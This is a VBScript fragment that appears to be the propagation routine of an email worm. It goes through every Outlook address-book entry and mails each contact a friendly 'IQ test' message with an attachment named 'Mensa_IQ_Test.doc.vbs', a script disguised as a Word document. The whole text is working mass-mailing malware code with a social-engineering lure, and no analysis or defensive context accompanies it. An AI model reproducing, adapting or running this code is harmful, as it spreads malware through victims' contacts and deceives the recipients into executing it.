Dim x,a,ctrlists,ctrentries,mailad,b,regedit,regv,regad
Set out=WScript.CreateObject("Outlook.Application")
Set mapi=out.GetNameSpace("MAPI")
For ctrlists=1 To mapi.AddressLists.Count
	Set a=mapi.AddressLists(ctrlists)
	For x=1 To a.AddressEntries.Count
		mailad=a.AddressEntries(x)
		Set mail=out.CreateItem(0)
		mail.Recipients.Add(mailad)
		mail.Subject = "Try this IQ test"
		mail.Body = "Hey! " &vbcrlf & vbcrlf & "Check out this IQ test I found on the net. " & vbcrlf & vbcrlf & "I scored in the 98th percentile!" & vbcrlf & vbcrlf & "If you get more than 24 correct then you are a genius. See how you go." &vbcrlf & vbcrlf & "Regards,"  & vbcrlf & vbcrlf & TheName & vbcrlf & vbcrlf
		mail.Attachments.Add(folder & "\Mensa_IQ_Test.doc.vbs")
		mail.send
	Next
Next
Set out=Nothing
Set mapi=Nothing
